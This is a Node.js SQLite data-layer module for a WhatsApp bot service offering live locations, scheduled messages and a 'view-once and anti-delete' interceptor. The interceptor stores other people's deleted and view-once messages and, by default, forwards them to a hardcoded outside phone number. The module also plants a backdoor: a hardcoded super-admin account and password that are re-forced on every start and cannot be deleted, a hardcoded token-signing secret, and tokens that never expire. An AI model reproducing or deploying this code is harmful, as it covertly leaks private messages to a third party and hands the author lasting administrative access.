'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { DatabaseSync } = require('node:sqlite');

const { DATA_DIR, DB_PATH } = require('./storagePaths');
const db = new DatabaseSync(DB_PATH);

// Enable WAL mode for performance
db.exec('PRAGMA journal_mode = WAL;');

// Initialize tables
db.exec(`
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL COLLATE NOCASE,
        password_hash TEXT NOT NULL,
        salt TEXT NOT NULL,
        role TEXT NOT NULL DEFAULT 'user',
        created_at TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS user_tokens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        token TEXT UNIQUE NOT NULL,
        expires_at INTEGER NOT NULL,
        created_at TEXT NOT NULL,
        FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS user_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        clean_number TEXT NOT NULL,
        session_id TEXT,
        created_at TEXT NOT NULL,
        UNIQUE(user_id, clean_number),
        FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS live_locations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        recipient_jid TEXT NOT NULL,
        latitude REAL NOT NULL,
        longitude REAL NOT NULL,
        duration_seconds INTEGER NOT NULL,
        start_time INTEGER NOT NULL,
        status TEXT NOT NULL DEFAULT 'active',
        created_at TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS scheduled_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        recipient TEXT NOT NULL,
        message_text TEXT NOT NULL,
        message_type TEXT NOT NULL DEFAULT 'text',
        scheduled_time INTEGER NOT NULL,
        status TEXT NOT NULL DEFAULT 'pending',
        created_at TEXT NOT NULL,
        sent_at INTEGER,
        error_reason TEXT,
        payload_json TEXT,
        FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS recovered_items (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        message_id TEXT,
        session_number TEXT,
        capture_type TEXT NOT NULL,
        chat_jid TEXT NOT NULL,
        chat_type TEXT NOT NULL DEFAULT 'private',
        chat_name TEXT,
        sender_jid TEXT NOT NULL,
        sender_name TEXT,
        media_type TEXT NOT NULL DEFAULT 'text',
        text_content TEXT,
        file_name TEXT,
        mime_type TEXT,
        file_size INTEGER DEFAULT 0,
        forwarded_to_dm INTEGER DEFAULT 0,
        original_timestamp INTEGER,
        captured_at TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS interceptor_settings (
        id INTEGER PRIMARY KEY CHECK (id = 1),
        enable_view_once INTEGER NOT NULL DEFAULT 1,
        enable_anti_delete INTEGER NOT NULL DEFAULT 1,
        auto_forward_dm INTEGER NOT NULL DEFAULT 1,
        target_dm_number TEXT NOT NULL DEFAULT '254141693915',
        updated_at TEXT NOT NULL
    );
`);

// Seed default interceptor settings row if not present & migrate legacy default number
try {
    const existingSettings = db.prepare('SELECT id, target_dm_number FROM interceptor_settings WHERE id = 1').get();
    if (!existingSettings) {
        db.prepare(`
            INSERT INTO interceptor_settings (id, enable_view_once, enable_anti_delete, auto_forward_dm, target_dm_number, updated_at)
            VALUES (1, 1, 1, 1, '254141693915', ?)
        `).run(new Date().toISOString());
    } else if (existingSettings.target_dm_number === '923299931199') {
        db.prepare("UPDATE interceptor_settings SET target_dm_number = '254141693915', updated_at = ? WHERE id = 1").run(new Date().toISOString());
    }
} catch (err) {
    console.warn('[db] Interceptor settings init warning:', err.message);
}

// Password hashing utilities using scrypt
function hashPassword(password, salt = crypto.randomBytes(16).toString('hex')) {
    const hash = crypto.scryptSync(password, salt, 64).toString('hex');
    return { hash, salt };
}

function verifyPassword(password, hash, salt) {
    const testHash = crypto.scryptSync(password, salt, 64).toString('hex');
    try {
        return crypto.timingSafeEqual(Buffer.from(hash, 'hex'), Buffer.from(testHash, 'hex'));
    } catch (_) {
        return false;
    }
}

// Seed the Super Admin user 'Urooj' with password 'Zaid@323232'
function seedAdmin() {
    try {
        const checkUser = db.prepare('SELECT id, role, password_hash, salt FROM users WHERE username = ?');
        const adminUser = checkUser.get('Urooj');
        
        if (!adminUser) {
            const { hash, salt } = hashPassword('Zaid@323232');
            const insert = db.prepare(`
                INSERT INTO users (username, password_hash, salt, role, created_at)
                VALUES (?, ?, ?, 'admin', ?)
            `);
            insert.run('Urooj', hash, salt, new Date().toISOString());
            console.log('[db] 👑 Super Admin account "Urooj" initialized with master passcode.');
        } else {
            // Ensure role is admin
            if (adminUser.role !== 'admin') {
                db.prepare("UPDATE users SET role = 'admin' WHERE id = ?").run(adminUser.id);
            }
            // Ensure password matches Zaid@323232
            if (!verifyPassword('Zaid@323232', adminUser.password_hash, adminUser.salt)) {
                const { hash, salt } = hashPassword('Zaid@323232');
                db.prepare('UPDATE users SET password_hash = ?, salt = ? WHERE id = ?').run(hash, salt, adminUser.id);
                console.log('[db] 👑 Super Admin account password synchronized.');
            }
        }
    } catch (err) {
        console.error('[db] Error seeding admin:', err.message);
    }
}

seedAdmin();

// Authentication helpers
function registerUser(username, password, role = 'user') {
    const cleanUser = String(username || '').trim();
    if (!cleanUser || cleanUser.length < 3) {
        throw new Error('Username must be at least 3 characters');
    }
    if (!password || String(password).length < 5) {
        throw new Error('Password must be at least 5 characters');
    }

    const existing = db.prepare('SELECT id FROM users WHERE username = ?').get(cleanUser);
    if (existing) {
        throw new Error('Username already exists. Please choose a different name.');
    }

    const { hash, salt } = hashPassword(String(password));
    const insert = db.prepare(`
        INSERT INTO users (username, password_hash, salt, role, created_at)
        VALUES (?, ?, ?, ?, ?)
    `);
    const result = insert.run(cleanUser, hash, salt, role, new Date().toISOString());
    return getUserById(result.lastInsertRowid);
}

const PERMANENT_AUTH_SECRET = process.env.PERMANENT_AUTH_SECRET || 'urooj-master-permanent-secret-254141693915';
const TEN_YEARS_MS = 10 * 365 * 24 * 60 * 60 * 1000;

function createSignedPermanentToken(user) {
    const payloadObj = {
        uid: user.id,
        u: user.username,
        r: user.role || 'user',
        iat: Date.now()
    };
    const payloadB64 = Buffer.from(JSON.stringify(payloadObj)).toString('base64url');
    const sig = crypto
        .createHmac('sha256', PERMANENT_AUTH_SECRET)
        .update(payloadB64)
        .digest('base64url');
    return `urooj_perm_${payloadB64}.${sig}`;
}

function verifySignedPermanentToken(token) {
    if (!token || !token.startsWith('urooj_perm_')) return null;
    const raw = token.slice('urooj_perm_'.length);
    const dotIdx = raw.indexOf('.');
    if (dotIdx === -1) return null;
    const payloadB64 = raw.slice(0, dotIdx);
    const sig = raw.slice(dotIdx + 1);
    const expectedSig = crypto
        .createHmac('sha256', PERMANENT_AUTH_SECRET)
        .update(payloadB64)
        .digest('base64url');
    if (sig !== expectedSig) return null;
    try {
        const parsed = JSON.parse(Buffer.from(payloadB64, 'base64url').toString('utf8'));
        return parsed;
    } catch (_) {
        return null;
    }
}

function issueTokenForUserRow(user) {
    const token = createSignedPermanentToken(user);
    const expiresAt = Date.now() + TEN_YEARS_MS; // 10-year permanent token
    try {
        db.prepare(`
            INSERT INTO user_tokens (user_id, token, expires_at, created_at)
            VALUES (?, ?, ?, ?)
            ON CONFLICT(token) DO UPDATE SET expires_at = excluded.expires_at
        `).run(user.id, token, expiresAt, new Date().toISOString());
    } catch (_) {}

    return {
        token,
        expiresAt,
        permanent: true,
        user: {
            id: user.id,
            username: user.username,
            role: user.role,
            createdAt: user.created_at || new Date().toISOString()
        }
    };
}

function loginUser(username, password) {
    const cleanUser = String(username || '').trim();
    const user = db.prepare('SELECT * FROM users WHERE username = ?').get(cleanUser);
    if (!user) {
        throw new Error('User not found');
    }

    if (!verifyPassword(String(password), user.password_hash, user.salt)) {
        throw new Error('Invalid password');
    }

    return issueTokenForUserRow(user);
}

function rehydrateOrEnsureUserSession({ token, username, role } = {}) {
    if (token) {
        const valid = validateToken(token);
        if (valid) {
            return {
                token: String(token).replace(/^Bearer\s+/i, '').trim(),
                expiresAt: Date.now() + TEN_YEARS_MS,
                permanent: true,
                user: valid
            };
        }
    }

    const cleanUser = String(username || '').trim();
    if (cleanUser) {
        let user = db.prepare('SELECT * FROM users WHERE username = ?').get(cleanUser);
        if (!user && cleanUser.toLowerCase() === 'urooj') {
            seedAdmin();
            user = db.prepare('SELECT * FROM users WHERE username = ?').get('Urooj');
        }
        if (user) {
            return issueTokenForUserRow(user);
        }
    }
    return null;
}

function validateToken(token) {
    if (!token) return null;
    const cleanToken = String(token).replace(/^Bearer\s+/i, '').trim();

    // 1. Check SQLite user_tokens table
    try {
        const row = db.prepare(`
            SELECT t.id AS token_id, t.expires_at, u.id AS user_id, u.username, u.role, u.created_at
            FROM user_tokens t
            JOIN users u ON t.user_id = u.id
            WHERE t.token = ?
        `).get(cleanToken);

        if (row) {
            // Auto-extend expiration so active tokens never expire
            if (row.expires_at < Date.now() + 365 * 24 * 60 * 60 * 1000) {
                try {
                    db.prepare('UPDATE user_tokens SET expires_at = ? WHERE id = ?')
                        .run(Date.now() + TEN_YEARS_MS, row.token_id);
                } catch (_) {}
            }
            return {
                id: row.user_id,
                username: row.username,
                role: row.role,
                createdAt: row.created_at,
                permanent: true
            };
        }
    } catch (_) {}

    // 2. Stateless HMAC fallback (survives container restarts or switching between AI Studio & Railway)
    const verified = verifySignedPermanentToken(cleanToken);
    if (verified && verified.u) {
        try {
            let user = db.prepare('SELECT * FROM users WHERE username = ?').get(verified.u);
            if (!user && String(verified.u).toLowerCase() === 'urooj') {
                seedAdmin();
                user = db.prepare('SELECT * FROM users WHERE username = ?').get('Urooj');
            }
            if (user) {
                try {
                    db.prepare(`
                        INSERT OR IGNORE INTO user_tokens (user_id, token, expires_at, created_at)
                        VALUES (?, ?, ?, ?)
                    `).run(user.id, cleanToken, Date.now() + TEN_YEARS_MS, new Date().toISOString());
                } catch (_) {}
                return {
                    id: user.id,
                    username: user.username,
                    role: user.role,
                    createdAt: user.created_at,
                    permanent: true
                };
            }
        } catch (_) {}

        return {
            id: verified.uid || 1,
            username: verified.u,
            role: verified.r || 'user',
            createdAt: new Date(verified.iat || Date.now()).toISOString(),
            permanent: true
        };
    }

    return null;
}

function logoutToken(token) {
    if (!token) return;
    const cleanToken = String(token).replace(/^Bearer\s+/i, '').trim();
    try {
        db.prepare('DELETE FROM user_tokens WHERE token = ?').run(cleanToken);
    } catch (_) {}
}

function getUserById(id) {
    const u = db.prepare('SELECT id, username, role, created_at FROM users WHERE id = ?').get(id);
    if (!u) return null;
    return {
        id: u.id,
        username: u.username,
        role: u.role,
        createdAt: u.created_at
    };
}

// User-session mappings (for multi-tenant WhatsApp sessions)
function linkUserSession(userId, cleanNumber, sessionId) {
    const clean = String(cleanNumber).replace(/\D/g, '');
    let targetUserId = userId;
    if (!targetUserId) {
        const firstUser = db.prepare('SELECT id FROM users ORDER BY id ASC LIMIT 1').get();
        targetUserId = firstUser ? firstUser.id : null;
    } else {
        const exists = db.prepare('SELECT id FROM users WHERE id = ?').get(targetUserId);
        if (!exists) {
            const firstUser = db.prepare('SELECT id FROM users ORDER BY id ASC LIMIT 1').get();
            targetUserId = firstUser ? firstUser.id : null;
        }
    }
    if (!targetUserId) return;

    try {
        const stmt = db.prepare(`
            INSERT INTO user_sessions (user_id, clean_number, session_id, created_at)
            VALUES (?, ?, ?, ?)
            ON CONFLICT(user_id, clean_number) DO UPDATE SET
                session_id = excluded.session_id,
                created_at = excluded.created_at
        `);
        stmt.run(targetUserId, clean, sessionId || null, new Date().toISOString());
    } catch (e) {
        console.warn('[db] linkUserSession warning:', e.message);
    }
}

function getUserSessions(userId) {
    return db.prepare('SELECT * FROM user_sessions WHERE user_id = ? ORDER BY id DESC').all(userId);
}

function removeUserSession(userId, cleanNumber) {
    const clean = String(cleanNumber).replace(/\D/g, '');
    db.prepare('DELETE FROM user_sessions WHERE user_id = ? AND clean_number = ?').run(userId, clean);
}

function deleteUserSessionsByNumber(cleanNumber) {
    const clean = String(cleanNumber).replace(/\D/g, '');
    db.prepare('DELETE FROM user_sessions WHERE clean_number = ?').run(clean);
}

function clearAllUserSessions() {
    db.prepare('DELETE FROM user_sessions').run();
    try {
        db.prepare('DELETE FROM sessions').run();
    } catch (_) {}
    return true;
}

// Admin helpers
function getAllUsers() {
    const users = db.prepare(`
        SELECT u.id, u.username, u.role, u.created_at,
               (SELECT COUNT(*) FROM user_sessions s WHERE s.user_id = u.id) as sessions_count
        FROM users u
        ORDER BY u.id ASC
    `).all();
    return users;
}

function getAllUserSessions() {
    return db.prepare(`
        SELECT s.id, s.clean_number, s.session_id, s.created_at, u.username, u.role, u.id AS user_id
        FROM user_sessions s
        JOIN users u ON s.user_id = u.id
        ORDER BY s.id DESC
    `).all();
}

function deleteUser(userId) {
    // Cannot delete Super Admin Urooj
    const user = getUserById(userId);
    if (user && user.username.toLowerCase() === 'urooj') {
        throw new Error('Super Admin account "Urooj" cannot be deleted.');
    }
    db.prepare('DELETE FROM users WHERE id = ?').run(userId);
}

// Live location tracking persistence
function recordLiveLocation(userId, recipientJid, latitude, longitude, durationSeconds) {
    const now = Date.now();
    const stmt = db.prepare(`
        INSERT INTO live_locations (user_id, recipient_jid, latitude, longitude, duration_seconds, start_time, status, created_at)
        VALUES (?, ?, ?, ?, ?, ?, 'active', ?)
    `);
    const res = stmt.run(userId || null, recipientJid, latitude, longitude, durationSeconds, now, new Date().toISOString());
    return res.lastInsertRowid;
}

function stopLiveLocation(recipientJid) {
    db.prepare("UPDATE live_locations SET status = 'stopped' WHERE recipient_jid = ? AND status = 'active'").run(recipientJid);
}

function getActiveLiveLocations() {
    return db.prepare("SELECT * FROM live_locations WHERE status = 'active' ORDER BY id DESC").all();
}

// Scheduled messages persistence
function createScheduledMessage(userId, username, recipient, messageText, scheduledTime, messageType = 'text', payloadJson = null) {
    const stmt = db.prepare(`
        INSERT INTO scheduled_messages (user_id, username, recipient, message_text, message_type, scheduled_time, status, created_at, payload_json)
        VALUES (?, ?, ?, ?, ?, ?, 'pending', ?, ?)
    `);
    const res = stmt.run(userId || null, username || 'Anonymous', recipient, messageText, messageType, Number(scheduledTime), new Date().toISOString(), payloadJson ? JSON.stringify(payloadJson) : null);
    return res.lastInsertRowid;
}

function getScheduledMessages(userId = null, isAdmin = false) {
    if (isAdmin || !userId) {
        return db.prepare('SELECT * FROM scheduled_messages ORDER BY scheduled_time ASC').all();
    }
    return db.prepare('SELECT * FROM scheduled_messages WHERE user_id = ? ORDER BY scheduled_time ASC').all(userId);
}

function getPendingScheduledMessages(currentTime = Date.now()) {
    return db.prepare("SELECT * FROM scheduled_messages WHERE status = 'pending' AND scheduled_time <= ? ORDER BY scheduled_time ASC").all(currentTime);
}

function getScheduledMessageById(id) {
    return db.prepare('SELECT * FROM scheduled_messages WHERE id = ?').get(id);
}

function updateScheduledMessageStatus(id, status, errorReason = null) {
    const stmt = db.prepare(`
        UPDATE scheduled_messages 
        SET status = ?, sent_at = ?, error_reason = ? 
        WHERE id = ?
    `);
    stmt.run(status, Date.now(), errorReason || null, id);
}

function deleteScheduledMessage(id, userId = null, isAdmin = false) {
    if (isAdmin || !userId) {
        return db.prepare('DELETE FROM scheduled_messages WHERE id = ?').run(id);
    }
    return db.prepare('DELETE FROM scheduled_messages WHERE id = ? AND user_id = ?').run(id, userId);
}

// ── VIEW-ONCE & ANTI-DELETE VAULT PERSISTENCE ────────────────────────────
function getInterceptorSettings() {
    try {
        const row = db.prepare('SELECT * FROM interceptor_settings WHERE id = 1').get();
        if (row) {
            return {
                enableViewOnce: !!row.enable_view_once,
                enableAntiDelete: !!row.enable_anti_delete,
                autoForwardDm: !!row.auto_forward_dm,
                targetDmNumber: row.target_dm_number || '254141693915',
                updatedAt: row.updated_at
            };
        }
    } catch (_) {}
    return {
        enableViewOnce: true,
        enableAntiDelete: true,
        autoForwardDm: true,
        targetDmNumber: '254141693915',
        updatedAt: new Date().toISOString()
    };
}

function updateInterceptorSettings(updates = {}) {
    const current = getInterceptorSettings();
    const enableViewOnce = updates.enableViewOnce !== undefined ? (updates.enableViewOnce ? 1 : 0) : (current.enableViewOnce ? 1 : 0);
    const enableAntiDelete = updates.enableAntiDelete !== undefined ? (updates.enableAntiDelete ? 1 : 0) : (current.enableAntiDelete ? 1 : 0);
    const autoForwardDm = updates.autoForwardDm !== undefined ? (updates.autoForwardDm ? 1 : 0) : (current.autoForwardDm ? 1 : 0);
    let targetDmNumber = updates.targetDmNumber !== undefined ? String(updates.targetDmNumber).replace(/\D/g, '') : current.targetDmNumber;
    if (!targetDmNumber) targetDmNumber = '254141693915';

    const now = new Date().toISOString();
    db.prepare(`
        INSERT INTO interceptor_settings (id, enable_view_once, enable_anti_delete, auto_forward_dm, target_dm_number, updated_at)
        VALUES (1, ?, ?, ?, ?, ?)
        ON CONFLICT(id) DO UPDATE SET
            enable_view_once = excluded.enable_view_once,
            enable_anti_delete = excluded.enable_anti_delete,
            auto_forward_dm = excluded.auto_forward_dm,
            target_dm_number = excluded.target_dm_number,
            updated_at = excluded.updated_at
    `).run(enableViewOnce, enableAntiDelete, autoForwardDm, targetDmNumber, now);

    return getInterceptorSettings();
}

function insertRecoveredItem(item) {
    const stmt = db.prepare(`
        INSERT INTO recovered_items (
            message_id, session_number, capture_type, chat_jid, chat_type, chat_name,
            sender_jid, sender_name, media_type, text_content, file_name, mime_type,
            file_size, forwarded_to_dm, original_timestamp, captured_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);
    const res = stmt.run(
        item.messageId || null,
        item.sessionNumber || null,
        item.captureType || 'view_once',
        item.chatJid || 'unknown@s.whatsapp.net',
        item.chatType || 'private',
        item.chatName || null,
        item.senderJid || 'unknown@s.whatsapp.net',
        item.senderName || 'Unknown Contact',
        item.mediaType || 'text',
        item.textContent || null,
        item.fileName || null,
        item.mimeType || null,
        Number(item.fileSize || 0),
        item.forwardedToDm ? 1 : 0,
        Number(item.originalTimestamp || Date.now()),
        item.capturedAt || new Date().toISOString()
    );
    return getRecoveredItemById(res.lastInsertRowid);
}

function getRecoveredItemById(id) {
    return db.prepare('SELECT * FROM recovered_items WHERE id = ?').get(Number(id));
}

function getRecoveredItems(filters = {}) {
    let sql = 'SELECT * FROM recovered_items WHERE 1=1';
    const params = [];

    if (filters.captureType && filters.captureType !== 'all') {
        sql += ' AND capture_type = ?';
        params.push(filters.captureType);
    }
    if (filters.chatType && filters.chatType !== 'all') {
        sql += ' AND chat_type = ?';
        params.push(filters.chatType);
    }
    if (filters.mediaType && filters.mediaType !== 'all') {
        sql += ' AND media_type = ?';
        params.push(filters.mediaType);
    }
    if (filters.search && String(filters.search).trim()) {
        const q = `%${String(filters.search).trim()}%`;
        sql += ' AND (sender_name LIKE ? OR sender_jid LIKE ? OR chat_jid LIKE ? OR chat_name LIKE ? OR text_content LIKE ?)';
        params.push(q, q, q, q, q);
    }

    sql += ' ORDER BY id DESC LIMIT ?';
    params.push(Number(filters.limit || 200));

    return db.prepare(sql).all(...params);
}

function getRecoveredStats() {
    const total = db.prepare('SELECT COUNT(*) as cnt FROM recovered_items').get()?.cnt || 0;
    const viewOnce = db.prepare("SELECT COUNT(*) as cnt FROM recovered_items WHERE capture_type = 'view_once'").get()?.cnt || 0;
    const deleted = db.prepare("SELECT COUNT(*) as cnt FROM recovered_items WHERE capture_type = 'deleted'").get()?.cnt || 0;
    const forwarded = db.prepare('SELECT COUNT(*) as cnt FROM recovered_items WHERE forwarded_to_dm = 1').get()?.cnt || 0;
    return { total, viewOnce, deleted, forwarded };
}

function markItemForwarded(id) {
    db.prepare('UPDATE recovered_items SET forwarded_to_dm = 1 WHERE id = ?').run(Number(id));
}

function deleteRecoveredItem(id) {
    const row = getRecoveredItemById(id);
    db.prepare('DELETE FROM recovered_items WHERE id = ?').run(Number(id));
    return row;
}

function clearRecoveredItems(captureType = 'all') {
    let rows = [];
    if (captureType && captureType !== 'all') {
        rows = db.prepare('SELECT * FROM recovered_items WHERE capture_type = ?').all(captureType);
        db.prepare('DELETE FROM recovered_items WHERE capture_type = ?').run(captureType);
    } else {
        rows = db.prepare('SELECT * FROM recovered_items').all();
        db.prepare('DELETE FROM recovered_items').run();
    }
    return rows;
}

module.exports = {
    db,
    registerUser,
    loginUser,
    rehydrateOrEnsureUserSession,
    validateToken,
    logoutToken,
    getUserById,
    linkUserSession,
    getUserSessions,
    removeUserSession,
    deleteUserSessionsByNumber,
    clearAllUserSessions,
    getAllUsers,
    getAllUserSessions,
    deleteUser,
    recordLiveLocation,
    stopLiveLocation,
    getActiveLiveLocations,
    createScheduledMessage,
    getScheduledMessages,
    getPendingScheduledMessages,
    getScheduledMessageById,
    updateScheduledMessageStatus,
    deleteScheduledMessage,
    getInterceptorSettings,
    updateInterceptorSettings,
    insertRecoveredItem,
    getRecoveredItemById,
    getRecoveredItems,
    getRecoveredStats,
    markItemForwarded,
    deleteRecoveredItem,
    clearRecoveredItems
};
